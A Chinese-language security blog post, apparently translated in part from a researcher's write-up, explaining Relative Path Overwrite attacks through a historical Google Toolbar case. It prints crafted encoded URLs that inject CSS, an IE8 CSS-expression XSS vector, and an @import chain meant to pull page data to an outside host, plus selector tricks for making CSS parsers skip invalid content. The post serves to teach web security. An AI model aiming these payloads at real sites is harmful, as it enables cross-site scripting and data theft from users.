---
title: RPO攻击
date: 2017-03-27 23:51:33
categories: Web安全
tags:
    - RPO
---

## 什么是RPO

RPO(Relative Path Overwrite)相对路径覆盖，是一种利用相对URL路径覆盖目标文件的一种攻击手段。

<!-- more -->

## google案例

翻译自[http://blog.innerht.ml/rpo-gadgets/](http://blog.innerht.ml/rpo-gadgets/).

### 识别RPO

RPO依赖于CSS解析器能够解析那些不严谨的语法内容，这是RPO攻击的基础条件，寻找RPO攻击的第一步是检查网页是否按正确的文档类型解析，然后寻找相对CSS样式的导入。

作者发现Google Toolbar的一个目标URL: `http://www.google.com/tools/toolbar/buttons/apis/howto_guide.html`, 该页面用相对路径导入CSS样式。

```html
<html>  
<head>  
<title>Google Toolbar API - Guide to Making Custom Buttons</title>  
<link href="../../styles.css" rel="stylesheet" type="text/css" />
```

下一步是找出目标服务器解析路径的方式。对浏览器来说，目录是通过 `/` 来分隔的，然而对服务器来说，路径中包含 `/`并不意味着存在一个目录。例如，JSP接收路径参数是以`;`作为分隔符的，例如`http://example.com/path;/notpath`，而浏览器并不识别这种模式，而当做是存在目录的路径。

同样，Google Toolbar也有它自己独特的解析路径的方式。在发送请求给服务器之前，会对请求进行处理并解码所有的路径，但是谷歌浏览器并不会强制转换`%2f`为`/`,因此可以将路径中的`/`替换为`%2f`。访问`http://www.google.com/tools/toolbar/buttons/apis%2fhowto_guide.html`

{% asset_img google_toolbar.png %}

针对上面的链接，服务器和浏览器对路径的解析是不一致的.

* 服务器视角: `/tools/toolbar/buttons/apis/` + howto_guide.html
* 浏览器视角: `/tools/toolbar/buttons/` + apis%2fhowto_guide.html
* 导入的css样式: `/tools/` + ~~toolbar/buttons/../../~~style.css

以上"+"左边高亮部分表示基本路径，浏览器认为基本路径是 `/tools/toolbar/buttons/` 而不是 `/tools/toolbar/buttons/apis/`, 因此导入相对路径的样式`../../style.css` 会额外多跳一层目录路径，本应该导入css的路径为"tools/toolbar/style.css", 而现在为"tools/style.xss"。

除了跳目录以外，还能制作假目录，例如，我们想在导入的样式路径为`/tools/fake/styles.css`, 可以构造如下url:`http://www.google.com/tools/fake/..%2ftoolbar/buttons/apis%2fhowto_guide.html`

* 服务器视角: /tools/~~fake/../~~toolbar/buttons/apis/ + howto_guide.html
* 浏览器视角: tools/fake/..%2ftoolbar/buttons/ + apis%2fhowto_guide.html
* 导入的css样式: /tools/fake/~~..%2ftoolbar/buttons/../../~~ + style.css

这里我们添加了两个虚假的路径:`fake/`和`..%2f`, 以便他们能在服务器相互抵消，同时浏览器认为`fake/`是一个真实的目录，并且，`..%2ftoobar`是另外一个目录。理论上，我们可以再根路径上导入任何样式，通过`https://www.google.com/*/styles.css`, 然而不幸的是代理只在` https://www.google.com/tools/*/styles.css`路径上有效，换句话说，任何在`/tools/`路径之外的路径采用编码魔术(`%2f`代替`/`)将不起作用, 也就是说，只能在`https://www.google.com/tools/*/styles.css.`导入任何样式。

我试图四处寻找，发现任何url都是静态的，除了,
`http://www.google.com/tools/toolbar/buttons/gallery`会重定向到`http://www.google.com/gadgets/directory?synd=toolbar&frontpage=1`。现在事情变得有趣了，参数`q`是作为搜索参数，并且反应在页面上，让我们注入一个简单的payload:`http://www.google.com/gadgets/directory?synd=toolbar&frontpage=1&q=%0a{}*{background:red}`

{% asset_img q_red.png %}

这非常棒，只要我们能通过某种方式导入样式参数`q`. 最后一步是找出如何在我们引用它作为样式的同时，维持查询字符串。RPO需要持续的注入,因为导入样式表并不包含查询字符串本身。但是由于路径解码的行为，我们能使用如下payload导入样式。

`http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/..%2f/apis/howto_guide.html`

* 服务器视角: /tools/toolbar/buttons/~~gallery?q=%0a{}*{background:red}/../~~/apis/ + howto_guide.html
* 浏览器视角: /tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/..%2f/apis/ + howto_guide.html
* 导入的css样式:

    - /tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bbackground%253Ared%257D/~~..%2f/apis/../../~~style.css
    - /tools/toolbar/buttons/gallery?q=%0a{}*{background:red}/style.css
    - /gadgets/directory?synd=toolbar&frontpage=1&q=%0a{}*{background:red}/style.css

{% asset_img RPO_red.png %}

我们还能做得更好么？当然，我们改变payload为 CSS XSS向量`expression(alert(document.domain))`，并启动IE8: `http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D*%257Bx%253Aexpression(alert(document.domain))%257D/..%2f/apis/`

{% asset_img rpo-expression-alert.png %}

### 使用RPO加载其他页面

我们可以使用RPO去偷其他页面的数据。CSS有一个有意思的地方，在怪异模式下，松散解析适用于所有导入的样式表，只要他们同源，这开辟了一个新的可能，如果导入的样式表包含机密数据和注入点，我们就能通过CSS魔法偷走他们。但这样的页面有最低要求如下：

* 注入点在机密数据之前出现
* 注入点允许`%0a`, `%0c` 或 `%0d`，以便于解析器的状态可以从一个错误的状态中恢复过来
* 机密数据和它周围不能包含换行符

`http://www.google.com/tools/toolbar/buttons%2fgallery%3fq%3d%250a%257B%257D%2540import%2527%252Fsearch%253Fnord%253D1%2526q%253D%257B%257D%25250a%2540import%252527%252F%252Finnerht.ml%253F%2522/..%2f/apis/howto_guide.html`

{% asset_img rrpo-gadget-chain-2 %}

## RPO 利用原理和条件

* 相对路径导入css样式
* 浏览器解析路径和服务器不一致，浏览器将服务器返回的不是css的文件当做CSS文件解析
* CSS解析器忽略非法的内容

### CSS解析器

CSS2 规范中指出，"在某些情况下，用户代理必须忽略非法样式的一部分”，规范定义忽略意味着解析非法部分(为了找到它开始和结束的地方), 同时又当它不存在。规范其他地方又补充到，“对于混合CSS内容和其他内容的文件，CSS会忽略非法的内容”。

那么，我们可以通过植入CSS代码，欺骗CSS解析器去忽略之前的不合法的语法内容，从而加载我们植入的CSS代码，最好的方法是选择一个无效的“选择器”，css会忽略之前所有的非法内容。

如下有两种利用选择器去忽略非法内容的方式，原理是CSS解析器解析`}`或`{}`都将工作

```
}*{color:#ccc;}
{}}*{color:#ccc;}
```

## Refer

* [http://edu.aqniu.com/article/65](http://edu.aqniu.com/article/65)
* [http://www.thespanner.co.uk/2014/03/21/rpo/](http://www.thespanner.co.uk/2014/03/21/rpo/)
* [http://blog.innerht.ml/rpo-gadgets/](http://blog.innerht.ml/rpo-gadgets/)
* [http://blog.portswigger.net/2015/02/prssi.html](http://blog.portswigger.net/2015/02/prssi.html)
